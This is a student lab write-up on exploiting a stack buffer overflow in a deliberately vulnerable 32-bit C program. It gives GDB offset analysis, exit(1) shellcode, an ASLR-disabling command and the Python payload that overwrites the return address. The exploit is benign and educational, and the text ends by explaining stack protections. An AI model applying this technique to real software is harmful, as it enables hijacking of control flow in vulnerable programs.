---
title: "Machine Problem 1: Exploiting a Stack Buffer Overflow to Execute exit(1)"
subtitle: "Stack Smash Attack — Writeup"
date: "2026-03-11"
author: "Al Glenrey Tilacas, Princess Parages, Jed Edison Donaire"
excerpt: "Exploiting a buffer overflow in a 32-bit C program by overwriting the saved return address with shellcode that calls exit(1), using gets() and the x86 int $0x80 syscall interface."
heroImage: "hero.png"
thumbnail: "hero.png"
---

## 1. Introduction

In this machine problem, we were given a simple C program that runs an infinite loop after accepting user input. The goal was to perform a stack smash attack, a type of buffer overflow exploit, to inject our own shellcode and force the program to exit with a specific exit code of 1.

This writeup walks through every step we took: from understanding the vulnerability, finding memory addresses, crafting the shellcode, and finally building the exploit payload (called the egg) that makes the program exit cleanly with code 1.

## 2. Understanding the Vulnerable Program

The vulnerable program, `vuln.c`, looks like this:

```c
// vuln.c
#include <stdio.h>

void vuln() {
    char buffer[8];
    gets(buffer);
}

int main() {
    vuln();
    while (1) {}
}
```

At first glance, this program just reads input from the user and then loops forever. But the danger is hidden in one line: `gets(buffer)`.

The `gets()` function is notoriously unsafe because it reads an unlimited number of characters into the buffer without checking how much space is actually available. Our buffer only has 8 bytes of space, but `gets()` will keep writing wherever the user types, even past the end of the buffer and into other parts of memory on the stack.

This is the classic buffer overflow vulnerability. By overflowing the buffer strategically, we can overwrite the saved return address (the EIP register) on the stack, which is the address the program jumps to when the `vuln()` function finishes. If we point EIP to our own code (shellcode), we control what the program does next.

## 3. Compiling the Program

We compiled the program with special flags that disable modern security protections so our exploit can work:

```bash
$ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 \
  -fno-pie -ggdb -z execstack -std=c99 vuln.c -o vuln
```

Here is what each flag does:

- **-m32** — compiles the program as 32-bit, which has a simpler and more predictable memory layout
- **-fno-stack-protector** — disables stack canaries, a protection that detects overflow attempts
- **-mpreferred-stack-boundary=2** — sets stack alignment so our byte offsets are predictable
- **-fno-pie** — disables position independent executable so addresses stay fixed
- **-z execstack** — allows code to be executed directly on the stack, which is needed to run our shellcode

## 4. Finding the Buffer Address with GDB

We used GDB (the GNU Debugger) to inspect the program memory while it runs. We set a breakpoint at the `vuln()` function and examined the stack:

```text
(gdb) break vuln
Breakpoint 1 at 0x1193: file vuln.c, line 5.
(gdb) run
Breakpoint 1, vuln () at vuln.c:5
5           gets(buffer);
(gdb) print &buffer
$1 = (char (*)[8]) 0xffffcd98
(gdb) info frame
Stack level 0, frame at 0xffffcda8:
 eip = 0x56556193 in vuln (vuln.c:5); saved eip = 0x565561aa
  ebp at 0xffffcda0, eip at 0xffffcda4
```

![GDB breakpoint and buffer address](/api/content/writeup2/writeup1.png)

![Stack layout diagram](/api/content/writeup2/writeup2.png)

From this output we learned the following layout in memory:

- The buffer starts at address `0xffffcd98`
- The saved EBP (base pointer) is at `0xffffcda0`, which is 8 bytes after the buffer
- The saved EIP (return address) is at `0xffffcda4`, which is 12 bytes after the buffer

### 4.1 Stack Layout Diagram

To visualize why this matters, here is how the stack looks at the moment `vuln()` is executing, from higher memory addresses down to lower:

| Memory (high → low) | Contents | Notes |
|--------------------|----------|--------|
| Higher addresses   | Saved Return Address (EIP) | ← we overwrite this |
|                    | Saved Frame Pointer (EBP)  | |
| Lower addresses    | buffer[8]                  | ← shellcode goes here |

In simple terms:

- buffer starts at offset 0
- saved EBP is at offset +8 bytes
- saved EIP is at offset +12 bytes

This means if we write 12 bytes of anything, we fill up the buffer and the saved EBP. The very next 4 bytes we write will land exactly on the saved EIP. That is how we redirect execution to our shellcode.

### 4.2 Confirming EIP Control

We verified this by writing 12 `A` characters followed by 4 `B` characters and watching EIP become `0x42424242` (which is `BBBB` in hexadecimal):

```bash
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*12 + b"BBBB")' > egg
```

```text
(gdb) run < egg
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()   <-- EIP is now BBBB
```

![EIP control confirmed in GDB](/api/content/writeup2/writeup3.png)

This confirms we have full control over the return address.

### 4.3 Memory Dump Before and After gets()

We also inspected the raw stack memory before and after `gets()` was called to see the overflow in action:

**Before gets():**

```text
0xffffcd98:  0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0xffffcda0:  0xa8 0xcd 0xff 0xff 0xaa 0x61 0x55 0x56
```

**After gets() with our egg input:**

```text
0xffffcd98:  0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41
0xffffcda0:  0x41 0x41 0x41 0x41 0x42 0x42 0x42 0x42
```

![Memory dump before and after gets()](/api/content/writeup2/writeup4.png)

The `A` bytes (0x41) filled up the buffer and overwrote EBP. The `B` bytes (0x42) then landed exactly on the return address, confirming our offset calculation was correct.

## 5. Writing the Shellcode

Shellcode is the machine code we want to inject and execute. Our goal is to call the Linux `exit(1)` system call. In x86 assembly on Linux, system calls are made by placing arguments in registers and then calling `int 0x80`. The exit syscall specifically requires:

| Register   | Value | Purpose                |
|------------|-------|------------------------|
| EAX        | 1     | syscall number (exit)  |
| EBX        | 1     | exit code              |
| int 0x80   | N/A   | trigger the syscall    |

In assembly instructions, this translates to:

```asm
xor %eax, %eax   ; set eax to 0
inc %eax         ; increment eax to 1 (exit syscall number)
mov %eax, %ebx   ; copy eax into ebx (exit code = 1)
int $0x80        ; trigger the Linux syscall
```

To get the actual machine code bytes for these instructions, we wrote them into a small C file with inline assembly and then disassembled it using objdump:

```bash
$ gcc -m32 -fno-stack-protector -fno-pie -std=c99 asm.c -o asm
$ objdump -d asm > asmdump
```

![objdump disassembly output](/api/content/writeup2/writeup5.png)

From the disassembly output we extracted the machine code bytes:

```text
1180:   31 c0    xor %eax,%eax
1182:   40       inc %eax
1183:   89 c3    mov %eax,%ebx
1185:   cd 80    int $0x80
```

Our complete shellcode is 7 bytes: `\x31\xc0\x40\x89\xc3\xcd\x80`

## 6. Building the Exploit Payload (The Egg)

### 6.1 Disabling ASLR

Before building the egg, we needed a stable, predictable stack address. The system had ASLR (Address Space Layout Randomization) enabled, which randomizes memory addresses on every run, making it impossible to hardcode an address. We disabled it with:

```bash
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0
```

```bash
$ echo "" | ./vuln2
buffer address: 0xffffcde8
$ echo "" | ./vuln2
buffer address: 0xffffcde8   <-- same every time now
```

### 6.2 Why GDB Gives a Different Address

An important subtlety: GDB reports the buffer address as `0xffffcd98`, but the real address outside GDB is `0xffffcde8`. This is because GDB injects extra environment variables into the process, which shifts the stack slightly. To find the true address, we compiled a helper version of the program (`vuln2`) with the exact same flags that prints its own buffer address at runtime. That gave us the real address: `0xffffcde8`.

### 6.3 Little Endian Byte Order

x86 systems use little endian byte order, meaning the least significant byte comes first when storing a multi-byte value in memory. Therefore the address `0xffffcde8` must be written as `\xe8\xcd\xff\xff` in our payload. The bytes are simply reversed from how we normally write the address.

### 6.4 Payload Structure and Padding Calculation

Our payload structure is:

```text
[ shellcode 7 bytes ][ padding 5 bytes ][ return address 4 bytes ]
```

The padding calculation is straightforward. We know the return address (EIP) is exactly 12 bytes from the start of the buffer. Our shellcode is 7 bytes. So we need padding to fill the remaining space:

```text
Offset to EIP      = 12 bytes
Shellcode length   =  7 bytes
Padding needed     =  5 bytes

7 + 5 = 12  (fills exactly up to EIP)
```

The 5 bytes of padding are just filler (we used the letter `A` five times). They overwrite the tail end of the buffer and the saved EBP register, neither of which matters since we are about to redirect execution anyway.

### 6.5 Generating the Egg

We assembled the final egg using Python to write the exact bytes to a file:

```bash
$ python3 -c 'import sys; sys.stdout.buffer.write(
    b"\x31\xc0\x40\x89\xc3\xcd\x80"
    + b"A"*5
    + b"\xe8\xcd\xff\xff"
)' > egg
```

We can verify the contents of the egg with `xxd`, which shows the raw bytes:

```text
$ xxd egg
00000000: 31c0 4089 c3cd 8041 4141 4141 e8cd ffff  1.@....AAAAA....
```

## 7. Results

We ran the exploit against the original `vuln` program and confirmed success:

```bash
$ ./vuln < egg; echo $?
1
```

![Exploit result: exit code 1](/api/content/writeup2/writeup6.png)

The program exited cleanly with exit code 1, which is exactly what the machine problem required. There was no segfault, no infinite loop, and no crash. The shellcode executed successfully, called `exit(1)`, and the process terminated with the correct code.

For additional verification, we also confirmed the exploit inside GDB, where it showed the process exiting with code 01:

```text
(gdb) run < egg
[Inferior 1 (process 3110) exited with code 01]
```

## 8. Summary

Here is a complete recap of every step taken from start to finish:

1. **Step 1:** Identified the buffer overflow vulnerability caused by `gets()`, which writes past the 8-byte buffer boundary without any size check.
2. **Step 2:** Used GDB to determine the exact memory layout. EIP is located 12 bytes from the start of the buffer.
3. **Step 3:** Confirmed EIP control by sending 12 `A` characters followed by `BBBB` and observing EIP become `0x42424242`.
4. **Step 4:** Wrote 7-byte shellcode that performs the Linux `exit(1)` syscall using `int 0x80` with EAX = 1 and EBX = 1.
5. **Step 5:** Disabled ASLR so stack addresses remain stable across runs.
6. **Step 6:** Found the real buffer address outside GDB (`0xffffcde8`) using a helper program compiled with identical flags.
7. **Step 7:** Built the egg: 7 bytes of shellcode, 5 bytes of padding, then the return address written in little endian byte order.
8. **Step 8:** Ran `./vuln < egg` and confirmed `echo $?` printed 1.

This experiment demonstrates how easily a simple programming mistake such as using `gets()` can allow an attacker to hijack control flow and execute arbitrary code. In real systems, similar bugs in input-handling code have been exploited to run attacker-supplied shellcode and compromise entire services. The root cause is trusting user input without validation and writing beyond fixed-size buffers. Modern protections like stack canaries, ASLR, and non-executable stacks exist precisely to prevent this kind of attack, and this exercise showed exactly why they are necessary by temporarily turning those defenses off and observing how straightforward the exploit becomes.
